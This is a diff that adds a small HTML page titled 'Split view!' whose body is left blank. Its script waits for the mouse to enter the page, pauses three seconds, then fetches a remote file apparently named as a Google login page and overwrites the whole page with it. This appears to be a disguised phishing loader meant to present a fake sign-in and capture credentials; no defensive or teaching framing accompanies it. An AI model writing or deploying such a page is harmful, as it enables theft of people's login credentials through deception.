@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Split view!</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 40px;
+      min-height: 100vh; /* full-page hover area */
+    }
+  </style>
+</head>
+<body>
+
+  <!-- intentionally blank -->
+
+  <script>
+    const url = 'https://raw.githubusercontent.com/frozzipies/frozzipies.github.io/refs/heads/main/google-login2.html';
+    let triggered = false;
+
+    document.addEventListener('mouseenter', async () => {
+      if (triggered) return;
+      triggered = true;
+
+      setTimeout(async () => {
+        try {
+          const response = await fetch(url);
+          const content = await response.text();
+
+          document.open();
+          document.write(content);
+          document.close();
+        } catch (err) {
+          document.open();
+          document.write('<h1>Error loading content</h1><pre>' + err + '</pre>');
+          document.close();
+        }
+      }, 3000); // 3 seconds delay
+
+    }, { once: true });
+  </script>
+
+</body>
+</html>
